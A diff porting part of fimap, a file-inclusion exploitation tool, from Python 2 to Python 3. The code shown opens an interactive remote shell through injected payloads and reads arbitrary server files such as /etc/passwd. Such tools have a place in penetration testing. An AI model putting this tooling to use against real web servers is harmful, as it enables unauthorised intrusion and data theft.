@@ -25,8 +25,8 @@ import os
 import sys
 from baseClass import baseClass
 from config import settings
-import urllib2
-import urlparse
+import urllib.request, urllib.error, urllib.parse
+import urllib.parse
 
 __author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
 __date__ ="$03.09.2009 03:40:49$"
@@ -252,7 +252,7 @@ class codeinjector(baseClass):
                     header_dict[vulnheaderkey] = tmp
                 code = self.__doHaxRequest(url, postdata, mode, php_test_code, langClass, appendix, headerDict=header_dict)
             else:
-                print "fimap is currently not configured to exploit RFI vulnerabilities."
+                print("fimap is currently not configured to exploit RFI vulnerabilities.")
                 sys.exit(1)
         elif (mode.find("r") != -1):
             # Some point which we know that we can include files but we haven't found any good vectors.
@@ -274,7 +274,7 @@ class codeinjector(baseClass):
             textarr.append("[q] Quit")
             
             if (idx == 1):
-                print "Sorry. No plugin was interested :("
+                print("Sorry. No plugin was interested :(")
                 sys.exit(0)
             else:
                 inp = ""
@@ -282,18 +282,18 @@ class codeinjector(baseClass):
                 
                 while (1==1):
                     self.drawBox(header, textarr)
-                    inp = raw_input("Your Selection: ")
+                    inp = input("Your Selection: ")
                     if (inp == "q" or inp == "Q"):
                         break
                     try:
                         val = int(inp)
                         if (val < 0 or val > idx-1):
-                            print "Invalid selection index. Hit 'q' to quit."
+                            print("Invalid selection index. Hit 'q' to quit.")
                         else:
                             haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, None)
                             plugman.broadcast_callback(choose[val], haxhelper)
                     except:
-                        print "Invalid number selected. Hit 'q' to quit."
+                        print("Invalid number selected. Hit 'q' to quit.")
                     
 
                     
@@ -353,7 +353,7 @@ class codeinjector(baseClass):
                         
                         
                         cmd = ""
-                        print "Please wait - Setting up shell (one request)..."
+                        print("Please wait - Setting up shell (one request)...")
                         #pwd_cmd = item.generatePayload("pwd;whoami")
                         
                         
@@ -365,7 +365,7 @@ class codeinjector(baseClass):
                         pwd_cmd = working_shell.generatePayload(xml2config.concatCommands(commands, isUnix))
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix, headerDict=header_dict).strip()
                         if (tmp.strip() == ""):
-                            print "Failed to setup shell! The resulting string was empty!"
+                            print("Failed to setup shell! The resulting string was empty!")
                             break
                         
                         curdir = "<null_dir>"
@@ -387,7 +387,7 @@ class codeinjector(baseClass):
                         if (curusr) == "":
                             curusr = "fimap"
                         
-                        print shell_banner
+                        print(shell_banner)
 
                         while 1==1:
                             cmd = None
@@ -403,7 +403,7 @@ class codeinjector(baseClass):
                                     
                             else:
                                 # Ask the user for a shell command.
-                                cmd = raw_input("fishell@%s:%s$> " %(curusr,curdir))
+                                cmd = input("fishell@%s:%s$> " %(curusr,curdir))
                             if cmd == "q" or cmd == "quit": break
                             
                             try:
@@ -434,11 +434,11 @@ class codeinjector(baseClass):
                                                     if (c != ""):
                                                         tab_choice.append(c)
                                             
-                                    print code.strip()
+                                    print(code.strip())
                             except KeyboardInterrupt:
-                                print "\nCancelled by user."
-                        print "See ya dude!"
-                        print "Do not forget to close this security hole."
+                                print("\nCancelled by user.")
+                        print("See ya dude!")
+                        print("Do not forget to close this security hole.")
                     else:
                         haxhelper = HaxHelper(self, url, postdata, mode, langClass, suffix, isUnix, sys_inject_works, working_shell)
                         plugman.broadcast_callback(attack, haxhelper)
@@ -456,20 +456,20 @@ class codeinjector(baseClass):
 
                     code = self.__doHaxRequest(url, postdata, mode, shellcode, langClass, appendix, headerDict=header_dict)
                     if (code == None):
-                        print "Exploiting Failed!"
+                        print("Exploiting Failed!")
                         sys.exit(1)
-                    print code.strip()
+                    print(code.strip())
         elif (code.find(php_test_code) != -1):
             
             try:
                 self._log("Injection not possible! It looks like a file disclosure bug.", self.LOG_WARN)
                 self._log("fimap can currently not readout files comfortably.", self.LOG_WARN)
-                go = raw_input("Do you still want to readout files (even without filtering them)? [Y/n] ")
+                go = input("Do you still want to readout files (even without filtering them)? [Y/n] ")
                 if (go == "Y" or go == "y" or go == ""):
                     while 1==1:
-                        inp = raw_input("Absolute filepath you want to read out: ")
+                        inp = input("Absolute filepath you want to read out: ")
                         if (inp == "q"):
-                            print "Fix this hole! Bye."
+                            print("Fix this hole! Bye.")
                             sys.exit(0)
                         payload = "%s%s%s" %(prefix, inp, suffix)
                         if (not ispost):
@@ -478,26 +478,26 @@ class codeinjector(baseClass):
                             postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
                         url = "http://%s%s" %(hostname, path)
                         code = self.__doHaxRequest(url, postdata, mode, "", langClass, appendix, False, headerDict=header_dict)
-                        print "--- Unfiltered output starts here ---"
-                        print code
-                        print "--- EOF ---"
+                        print("--- Unfiltered output starts here ---")
+                        print(code)
+                        print("--- EOF ---")
                 else:
-                    print "Cancelled. If you want to read out files by hand use this URL:"
+                    print("Cancelled. If you want to read out files by hand use this URL:")
                     
                     if (not ispost):
                         path = fpath.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                         url = "http://%s%s" %(hostname, path)
-                        print "URL: " + url
+                        print("URL: " + url)
                     else:
                         postdata = postdata.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, "ABSOLUTE_FILE_GOES_HERE"))
                         url = "http://%s%s" %(hostname, path)
-                        print "URL          : " + url
-                        print "With Postdata: " + postdata
+                        print("URL          : " + url)
+                        print("With Postdata: " + postdata)
             except KeyboardInterrupt:
                 raise
 
         else:
-            print "Failed to test injection. :("
+            print("Failed to test injection. :(")
 
 
     def _doHaxRequest(self, url, postdata, m, payload, langClass, appendix=None, doFilter=True, headerDict=None):
@@ -639,54 +639,54 @@ class codeinjector(baseClass):
         xml2config = self.config["XML2CONFIG"]
         langClass = xml2config.getAllLangSets()
         
-        for langName, langObj in langClass.items():
-            print "Testing language %s..." %(langName)
+        for langName, langObj in list(langClass.items()):
+            print("Testing language %s..." %(langName))
             c, r = langObj.generateQuiz()
             
             enc_c = self.payload_encode(c)
             
             if (settings["dynamic_rfi"]["mode"] == "local"):
-                print "Testing Local->RFI configuration..."
+                print("Testing Local->RFI configuration...")
                 code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", "", c, {})
                 if (code == enc_c):
-                    print "Dynamic RFI works!"
+                    print("Dynamic RFI works!")
                     for ext in langObj.getExtentions():
-                        print "Testing %s interpreter..." %(ext)
+                        print("Testing %s interpreter..." %(ext))
                         #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ext
                         code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ext, "", ext, c, {})
                         if (code == r):
-                            print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
+                            print("WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext))
                         else:
                             pass # Seems to be not interpreted...
                 else:
-                    print "Failed! Something went wrong..."
+                    print("Failed! Something went wrong...")
     
     
             elif (settings["dynamic_rfi"]["mode"] == "ftp"):
-                print "Testing FTP->RFI configuration..."
+                print("Testing FTP->RFI configuration...")
                 code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", "", c, {})
                 if (code != None):
                     code = code.strip()
                     if (code == enc_c):
-                        print "Dynamic RFI works!"
+                        print("Dynamic RFI works!")
                         for ext in langObj.getExtentions():
-                            print "Testing %s interpreter..."%(ext)
+                            print("Testing %s interpreter..."%(ext))
                             #settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ext
                             code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ext, "", ext, c, {})
                             if (code.find(r) != -1):
-                                print "WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext)
+                                print("WARNING! Files which ends with %s will be interpreted! Fix that!"%(ext))
                             else:
                                 pass # Seems to be not interpreted...
                                 
     
                     else:
-                        print "Failed! Something went wrong..."
-                        print "Code: " + code;
+                        print("Failed! Something went wrong...")
+                        print("Code: " + code);
                 else:
-                    print "Code == None. That's not good! Failed!"
+                    print("Code == None. That's not good! Failed!")
             else:
-                print "You haven't enabled and\\or configurated fimap RFI mode."
-                print "Fix that in config.py"
+                print("You haven't enabled and\\or configurated fimap RFI mode.")
+                print("Fix that in config.py")
                 sys.exit(0)
             
 
@@ -740,15 +740,15 @@ class codeinjector(baseClass):
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
         while (1==1):
-            tech = raw_input("Choose Attack: ")
+            tech = input("Choose Attack: ")
             try:
                 if (tech.strip() == "q"):
                     sys.exit(0)
                 tech = choose[int(tech)]
                 return(tech)
 
-            except Exception, err:
-                print "Invalid attack. Press 'q' to break."
+            except Exception as err:
+                print("Invalid attack. Press 'q' to break.")
         
         
     def executeRFI(self, URL, postdata, appendix, content, header):
@@ -815,10 +815,10 @@ class codeinjector(baseClass):
                 missingCount += 1
     
         if (idx == 1):
-            print "No exploitable domains found."
+            print("No exploitable domains found.")
             if (missingCount > 0):
-                print "There are some domains hidden tho because they can't be exploited by fimap without help."
-                print "To show them start fimap with *uppercase* -X"
+                print("There are some domains hidden tho because they can't be exploited by fimap without help.")
+                print("To show them start fimap with *uppercase* -X")
             sys.exit(0)
     
         if (missingCount > 0):
@@ -827,7 +827,7 @@ class codeinjector(baseClass):
         textarr.append("[q] Quit")
         self.drawBox(header, textarr)
         if (doRemoteWarn):
-            print "WARNING: Some domains may be not listed here because dynamic_rfi is not configured! "
+            print("WARNING: Some domains may be not listed here because dynamic_rfi is not configured! ")
 
         # If the user has picked the domain already through a parameter
         # we just try to set it here and return its result.
@@ -839,39 +839,39 @@ class codeinjector(baseClass):
                 if (n.getAttribute("hostname") == wantedDomain):
                     return(n)
             
-            print "The domain '%s' doesn't exist! Can't continue :(" %(wantedDomain)
+            print("The domain '%s' doesn't exist! Can't continue :(" %(wantedDomain))
             sys.exit(1)
 
 
 
         while(1==1):
-            c = raw_input("Choose Domain: ")
+            c = input("Choose Domain: ")
             if (c == "q"):
                 sys.exit(0)
             elif (c == "?"):
-                print "------------------------------------------------------------------------------"
-                print "Why are some domains not visible?"
-                print "This can have two reasons."
-                print "* Non executable files:"
-                print "  It's likly that fimap has found an inclusion bug and was able to read out"
-                print "  non executable files like '/etc/passwd' or 'c:\\boot.ini'."
-                print "  In cases like this it's not possible to automaticly attack the machine."
-                print "  However if you are able to upload a file on the webserver you have high"
-                print "  chances to spawn a shell."
-                print "* Remote File Inclusion bugs:"
-                print "  If you have found RFI only bugs you have to enable Dynamic RFI in order to"
-                print "  exploit the bug with fimap. The RFI-Only domains will be hidden unless you"
-                print "  have configured and enabled Dynamic RFI."
-                print "  However you can always take a look at the ~/fimap_result.xml , get your info"
-                print "  and do it manually."
-                print "------------------------------------------------------------------------------"
+                print("------------------------------------------------------------------------------")
+                print("Why are some domains not visible?")
+                print("This can have two reasons.")
+                print("* Non executable files:")
+                print("  It's likly that fimap has found an inclusion bug and was able to read out")
+                print("  non executable files like '/etc/passwd' or 'c:\\boot.ini'.")
+                print("  In cases like this it's not possible to automaticly attack the machine.")
+                print("  However if you are able to upload a file on the webserver you have high")
+                print("  chances to spawn a shell.")
+                print("* Remote File Inclusion bugs:")
+                print("  If you have found RFI only bugs you have to enable Dynamic RFI in order to")
+                print("  exploit the bug with fimap. The RFI-Only domains will be hidden unless you")
+                print("  have configured and enabled Dynamic RFI.")
+                print("  However you can always take a look at the ~/fimap_result.xml , get your info")
+                print("  and do it manually.")
+                print("------------------------------------------------------------------------------")
             else:
               try:
                   c = int(c)
                   ret = choose[c]
                   return(ret)
               except:
-                  print "Invalid Domain ID."
+                  print("Invalid Domain ID.")
                   
 
 
@@ -922,11 +922,11 @@ class codeinjector(baseClass):
             
         if (idx == 1):
             if (doRemoteWarn):
-                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
+                print("WARNING: Some bugs can not be used because dynamic_rfi is not configured!")
             if (hasAtLeastAReadable):
                 return(n)
             else:
-                print "This domain has no usable bugs."
+                print("This domain has no usable bugs.")
                 sys.exit(1)
 
         
@@ -934,12 +934,12 @@ class codeinjector(baseClass):
         self.drawBox(header, textarr)
 
         if (doRemoteWarn):
-            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"
+            print("WARNING: Some bugs are suppressed because dynamic_rfi is not configured!")
 
         
 
         while (1==1):
-            c = raw_input("Choose vulnerable script: ")
+            c = input("Choose vulnerable script: ")
             if (c == "q"):
                 sys.exit(0)
             try:
@@ -947,7 +947,7 @@ class codeinjector(baseClass):
                 ret = choose[c]
                 return(ret)
             except:
-                print "Invalid script ID."
+                print("Invalid script ID.")
                 
                 
 class HaxHelper:
@@ -1059,7 +1059,7 @@ class HaxHelper:
     def getRawHTTPRequest(self, customFile):
         path, post, header, payload = self.parent_codeinjector.getPreparedComponents(customFile)
         hasPost = post != None and post != ""
-        host = urlparse.urlsplit(self.url)[1]
+        host = urllib.parse.urlsplit(self.url)[1]
         
         ret = ""
         if (not hasPost):
@@ -1069,7 +1069,7 @@ class HaxHelper:
         
         ret += "Host: %s\r\n" %(host)
         
-        if header.has_key("Cookie"):
+        if "Cookie" in header:
             ret += "Cookie: "
             for k,v in header["Cookie"]:
                 ret += "%s: %s;" %(k,v)
